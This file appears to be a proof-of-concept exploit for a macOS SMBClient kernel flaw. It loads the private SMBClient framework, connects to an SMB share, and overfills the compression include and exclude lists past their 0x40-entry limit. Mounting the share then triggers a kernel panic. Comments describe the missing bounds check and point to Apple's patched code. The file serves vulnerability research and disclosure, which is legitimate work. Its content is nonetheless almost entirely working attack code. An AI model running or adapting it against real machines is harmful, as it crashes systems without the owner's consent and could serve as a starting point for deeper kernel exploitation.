#import <stdio.h>
#import <stdint.h>
#import <stdlib.h>
#import <unistd.h>
#import <sys/mman.h>
#import <errno.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <pthread.h>
#import <unistd.h>

#import <sys/mount.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>
#import <sys/ioctl.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <IOKit/kext/KextManager.h>   

#import "smbfs.h"
#import "msfscc.h"

#define MOUNTDIR           "/tmp/mounted"

void *SMBClientHandle = NULL;

NTSTATUS SMBOpenServerEx(const char * targetServer, SMBHANDLE * outConnection, uint64_t options) {
    void *funcAddr = dlsym(SMBClientHandle, "SMBOpenServerEx");
    typedef NTSTATUS (*smb_func_t)(const char *, SMBHANDLE *, uint64_t);
    smb_func_t func = (smb_func_t) funcAddr;
    return func(targetServer, outConnection, options);
}

NTSTATUS SMBReleaseServer(SMBHANDLE inConnection) {
    void *funcAddr = dlsym(SMBClientHandle, "SMBReleaseServer");
    typedef NTSTATUS (*smb_func_t)(SMBHANDLE);
    smb_func_t func = (smb_func_t) funcAddr;
    return func(inConnection);
}

NTSTATUS SMBMountShareExDict(
    SMBHANDLE inConnection,
    const char *targetShare,
    const char *mountPoint,
    CFDictionaryRef mountOptions,
    CFDictionaryRef *retMountInfo,
    void (*callout)(void *, void *),
    void *args)
{
    void *funcAddr = dlsym(SMBClientHandle, "SMBMountShareExDict");
    typedef NTSTATUS (*mount_func_t)(SMBHANDLE, const char *, const char *,
                                     CFDictionaryRef, CFDictionaryRef *,
                                     void (*)(void *, void *), void *);
    mount_func_t func = (mount_func_t) funcAddr;
    return func(inConnection, targetShare, mountPoint, mountOptions, retMountInfo, callout, args);
}

CFMutableDictionaryRef CreateMountOptions(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault,
        0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    int zero = 0;
    CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &zero);
    CFDictionarySetValue(dict, CFSTR("MountFlags"), num);
    CFRelease(num);

    return dict;
}

void fill_exclude_list_alloc(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {

    for (uint32_t i = 0; i < count; i++) {
        char *str = (char *)malloc(len + 1);
        if (!str) continue;
        memset(str, c, len);
        str[len] = '\0';

        ctx->prefs.compression_exclude[i] = str;
    }
    ctx->prefs.compression_exclude_cnt = count;
}

void fill_include_list_alloc(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {

    for (uint32_t i = 0; i < count; i++) {
        char *str = (char *)malloc(len + 1);
        if (!str) continue;
        memset(str, c, len);
        str[len] = '\0';

        ctx->prefs.compression_include[i] = str;
    }
    ctx->prefs.compression_include_cnt = count;
}



void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", &data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}




int main(int argc, char *argv[], char *envp[]) {    

    // 1. create dir for mount
    if(access(MOUNTDIR, F_OK) != 0) mkdir(MOUNTDIR, 0755);

    // 2. Open SMBClient handle
    SMBClientHandle = dlopen("/System/Library/PrivateFrameworks/SMBClient.framework/SMBClient", RTLD_NOW);
    printf("SMBClientHandle = %p\n", SMBClientHandle);

    // 3. Call SMBOpenServerEx
    SMBHANDLE serverConnection = NULL;
    // Edit here: USER_ID, SMB_SERVER_IP, share....
    NTSTATUS status = SMBOpenServerEx("//[USER_ID]:[USER_PW]@[SMB_IP]:[SMB_PORT]/share", &serverConnection, kSMBOptionSessionOnly);
    printf("SMBOpenServerEx status = 0x%x\n", status);

    // 4. Obtain serverConnection info
    struct smb_server_handle *handle = (struct smb_server_handle *)serverConnection;
    struct smb_ctx *ctx = handle->context;
    struct smb_prefs *prefs = &ctx->prefs; 

    uint32_t excl_cnt = prefs->compression_exclude_cnt;
    uint32_t incl_cnt = prefs->compression_include_cnt;


    // BUG is here; there's no check about compression_include_cnt, compression_exclude_cnt;
    // patched vulns code is at https://github.com/apple-oss-distributions/SMBClient/blob/SMBClient-494.120.2/kernel/smbfs/smbfs_vfsops.c#L1110
    // Related strings are:
    // SMBERROR("compression_exclude_cnt <%d> greater than max allowed <%d>", args->compression_exclude_cnt, kClientCompressMaxEntries);
    // SMBERROR("compression_include_cnt <%d> greater than max allowed <%d>", rgs->compression_include_cnt, kClientCompressMaxEntries - 1);
    
    // if greater than kClientCompressMaxEntries(=0x40), than triggers panic
    fill_include_list_alloc(ctx, 0x41, 16, 'A'); 
    fill_exclude_list_alloc(ctx, 0x41, 16, 'B');

    // 5. mount smbfs
    CFMutableDictionaryRef mOptions = CreateMountOptions();
    if (NT_SUCCESS(status)) {
        status = SMBMountShareExDict((SMBHANDLE)serverConnection, NULL, MOUNTDIR,
                                     mOptions, NULL,
                                     NULL, NULL);
        printf("SMBMountShareExDict status = 0x%x\n", status);
	}

    dlclose(SMBClientHandle);

    unmount(MOUNTDIR, MNT_FORCE);

    puts("no panic?");

    return 0;
}
